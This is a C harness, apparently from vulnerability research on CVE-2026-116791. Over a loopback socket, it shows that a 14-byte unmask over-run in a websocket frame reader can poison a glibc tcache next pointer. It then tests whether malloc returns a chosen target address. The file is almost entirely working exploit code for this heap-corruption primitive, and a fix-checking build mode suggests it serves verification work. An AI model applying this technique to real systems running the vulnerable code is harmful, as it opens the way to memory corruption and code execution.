/*
 * W4: bounded tcache-next poisoning experiment for CVE-2026-116791.
 *
 * Includes the W1/W2/W3 harness verbatim with its main renamed, so canonical
 * real_layout.c line numbers and evidence stay untouched. Pinned ws_read_frame
 * slices are still included verbatim and hash-asserted by run_w4.sh.
 *
 * Allocation order puts a free 0x90 tcache chunk immediately after bbuffer:
 *   vB (second tcache entry) -> frame -> wsh -> buffer -> bbuffer -> vA (head)
 * then free(vB); free(vA). The 14-byte unmask over-run can reach vA->next,
 * the safe-linked tcache pointer. An attacker-chosen 4-byte mask is derived
 * from a runtime-chosen aligned target T in a scratch mmap region. Two
 * malloc(128) calls test whether the poisoned head is followed.
 *
 * No live service, no command, no marker execution. Any pointer readback is
 * rung-4 mechanics and is conditional on knowing the original safe-linked
 * pointer (a heap-leak prerequisite).
 */
#define main real_layout_main_unused
#include "real_layout.c"
#undef main

#include <sys/mman.h>

#define VMIN(a,b) ((a) < (b) ? (a) : (b))

static void put64(const char *label, uint64_t v)
{
    int i;
    fprintf(stderr, "%s=", label);
    for (i = 7; i >= 0; i--) fprintf(stderr, "%02x", (unsigned)((v >> (8*i)) & 0xffu));
    fprintf(stderr, "\n");
}

static void putbytes(const char *label, const uint8_t *p, size_t n)
{
    size_t i;
    fprintf(stderr, "%s=", label);
    for (i = 0; i < n; i++) fprintf(stderr, "%02x", p[i]);
    fprintf(stderr, "\n");
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "geom";
    int do_realloc = (strcmp(mode, "realloc") == 0);
    int do_short = (strcmp(mode, "short") == 0);
    size_t bbuflen = BBUF_LEN;
    size_t payload_len;
    uint8_t *scratch, *vB, *vA, *frame;
    uint64_t va_u, vb_u;
    uint8_t *va, *vb;
    uint8_t next0[8], next1[8], want[8], key_before[8], key_after[8];
    uint64_t pa, target = 0;
    size_t maplen = (size_t)64 << 20;
    size_t span, off, k, nwrite;
    int sidx, found = 0;
    wsh_t *wsh;
    ws_opcode_t oc = WSOC_CONTINUATION;
    void *p1, *p2;
    uint8_t *data = NULL;
    uint64_t u64;
    int cli_fd, poison_ok = 1, p1_ok, p2_ok;
    size_t usable;

#ifdef PIN_FIXED
    fprintf(stderr, "PIN_FIXED=1\n");
#endif

    if (do_realloc) {
        payload_len = 65544;
    } else if (do_short) {
        bbuflen = 65527;
        payload_len = 65520;
    } else {
        bbuflen = argc > 2 ? (size_t)strtoul(argv[2], NULL, 10) : 65527;
        payload_len = bbuflen;
    }

    /* vB: second entry in the 0x90 tcache bin. */
    vB = (uint8_t *)malloc(128);
    if (!vB) return 2;
    memset(vB, 0xC3, 128);
    vb_u = (uint64_t)(uintptr_t)vB;
    vb = (uint8_t *)&vb_u;

    /* Scratch target region: byte4 low nibble must equal vB0^vB4 so the
     * shared mask[0] byte can produce a 16-aligned T. For a 5-byte extent
     * byte5 of next is unwritten, so T5 must equal vB5. */
    {
        uint64_t n4 = (uint64_t)(vb[0] ^ vb[4]) & 0xfULL;
        uint64_t base = n4 << 32;
        unsigned bi;
        if (!do_realloc) base |= ((uint64_t)vb[5]) << 40;
        scratch = MAP_FAILED;
        for (bi = 0; bi < 16; bi++) {
            scratch = (uint8_t *)mmap((void *)(uintptr_t)(base + ((uint64_t)bi << 24)),
                        maplen, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
            if (scratch != MAP_FAILED) break;
        }
        if (scratch == MAP_FAILED) { fprintf(stderr, "MMAP_FAIL\n"); return 2; }
        fprintf(stderr, "SCRATCH=%p\n", (void *)scratch);
    }
    /* Scan uses address bytes from an integer copy, so filling memory is safe.
     * The tcache_get on the poisoned target clears its key slot at T+8. */
    memset(scratch, 0xAA, maplen);

    frame = (uint8_t *)malloc(14 + payload_len);
    if (!frame) return 2;

    g_srv_fd = make_loopback_pair(&cli_fd);
    if (g_srv_fd < 0) { fprintf(stderr, "LOOPBACK_FAIL\n"); return 2; }

    wsh = (wsh_t *)calloc(1, sizeof(*wsh));
    if (!wsh) return 2;
    wsh->handshake = 1;
    wsh->buflen = BBUF_LEN;
    wsh->buffer = (char *)malloc(wsh->buflen);
#ifdef PIN_FIXED
    wsh->bbuflen = bbuflen;
    wsh->bbuffer = (char *)malloc(wsh->bbuflen + 1);
#else
    wsh->bbuflen = bbuflen;
    wsh->bbuffer = (char *)malloc(wsh->bbuflen);
#endif
    if (!wsh->buffer || !wsh->bbuffer) return 2;
    wsh->payload_size_max = 4 * 1024 * 1024;
    wsh->block = WS_BLOCK;
    wsh->sock = g_srv_fd;
    wsh->body = wsh->bbuffer;
    usable = malloc_usable_size(wsh->bbuffer);

    /* vA: immediately after bbuffer; will be the tcache head. */
    vA = (uint8_t *)malloc(128);
    if (!vA) return 2;
    memset(vA, 0xC3, 128);
    va_u = (uint64_t)(uintptr_t)vA;
    vb_u = (uint64_t)(uintptr_t)vB;
    va = (uint8_t *)(uintptr_t)va_u;
    vb = (uint8_t *)&vb_u;
    fprintf(stderr, "GEOM BUFFER=%p VICTIM_A=%p VICTIM_B=%p OFF=%zd USABLE=%zu BBUFREQ=%zu\n",
            (void *)wsh->bbuffer, (void *)(uintptr_t)va_u, (void *)(uintptr_t)vb_u,
            vA - (uint8_t *)wsh->bbuffer, usable, bbuflen);

    free(vB);
    free(vA);
    memcpy(next0, va, 8);
    pa = va_u >> 12;
    memcpy(&u64, next0, sizeof(u64));
    put64("NEXT_BEFORE", u64);
    put64("SAFELINK_EXPECT", pa ^ vb_u);

    /* Extent into vA user data: geom 65527 -> 5 bytes; realloc 65544 -> 6.
     * Both start at mask index 0 (verified in W2). */
    nwrite = do_realloc ? 6 : 5;
    sidx = (int)((bbuflen + (usable + 8 >= bbuflen ? usable + 8 - bbuflen : 0)) % 4);
    fprintf(stderr, "NWRITE=%zu MASK_START=%d\n", nwrite, sidx);

    /* Scan the scratch mmap for a 16-aligned T satisfying the repeating-mask
     * byte constraints. For a 5-byte extent byte5 stays original, i.e. T5=vB5.
     * For 6 bytes T0/T4 and T1/T5 deltas must agree. */
    for (span = 0; span + 4096 <= maplen; span += 4096) {
        uint8_t *page = scratch + span;
        for (off = 0; off + 16 <= 4096; off += 16) {
            uint8_t *t = page + off;
            uint64_t tu = (uint64_t)(uintptr_t)t;
            uint8_t *tb = (uint8_t *)&tu;
            if ((uintptr_t)t & 15u) continue;
            if (nwrite == 5 && tb[5] != vb[5]) continue;
            if ((uint8_t)(vb[0] ^ tb[0]) != (uint8_t)(vb[4] ^ tb[4])) continue;
            if (nwrite == 6 && (uint8_t)(vb[1] ^ tb[1]) != (uint8_t)(vb[5] ^ tb[5])) continue;
            target = tu;
            found = 1;
            break;
        }
        if (found) break;
    }
    if (!found) { fprintf(stderr, "NO_TARGET\n"); return 2; }
    put64("TARGET", target);

    /* next0 = P_A ^ vB, so mask[k] = vB[k] ^ T[k] for writable bytes. */
    for (k = 0; k < 4; k++) g_mask[k] = 0;
    for (k = 0; k < nwrite; k++)
        g_mask[(sidx + k) % 4] = (uint8_t)(vb[k] ^ ((uint8_t *)&target)[k]);
    putbytes("MASK", g_mask, 4);

    build_frame(frame, payload_len);
    write_all(cli_fd, frame, 14 + payload_len);

    {
        ssize_t rv = ws_read_frame(wsh, &oc, &data);
        fprintf(stderr, "POSTCALL RV=%zd DATALEN=%zd RPLEN=%zd BBLEN=%zu\n",
                rv, wsh->datalen, wsh->rplen, wsh->bbuflen);
    }

    memcpy(next1, va, 8);
    putbytes("NEXT_AFTER_BYTES", next1, 8);
    for (k = 0; k < 8; k++) {
        uint8_t wantbyte = k < nwrite
            ? (uint8_t)((pa ^ target) >> (8 * k))
            : next0[k];
        want[k] = wantbyte;
        if (next1[k] != wantbyte) poison_ok = 0;
    }
    putbytes("NEXT_WANT_BYTES", want, 8);
    fprintf(stderr, "POISON_OK=%d\n", poison_ok);

    memcpy(key_before, (uint8_t *)(uintptr_t)(target + 8), 8);
    p1 = malloc(128);
    p2 = malloc(128);
    memcpy(key_after, (uint8_t *)(uintptr_t)(target + 8), 8);
    putbytes("KEY_BEFORE", key_before, 8);
    putbytes("KEY_AFTER", key_after, 8);
    {
        int cleared = 1, q;
        for (q = 0; q < 8; q++) if (key_after[q] != 0) cleared = 0;
        fprintf(stderr, "KEY_CLEARED_AT_TARGET=%d\n", cleared);
    }
    p1_ok = (p1 == (void *)(uintptr_t)va_u);
    p2_ok = (p2 == (void *)(uintptr_t)target);
    fprintf(stderr, "PTR1=%p PTR2=%p EXPECT1=%p EXPECT2=%p PTR1_OK=%d PTR2_OK=%d\n",
            p1, p2, (void *)(uintptr_t)va_u, (void *)(uintptr_t)target, p1_ok, p2_ok);
    fprintf(stderr, "RESULT VULN_POISON=%d VULN_POINTER=%d\n",
            poison_ok, p1_ok && p2_ok);
    return (poison_ok && p1_ok && p2_ok) ? 0 : 1;
}
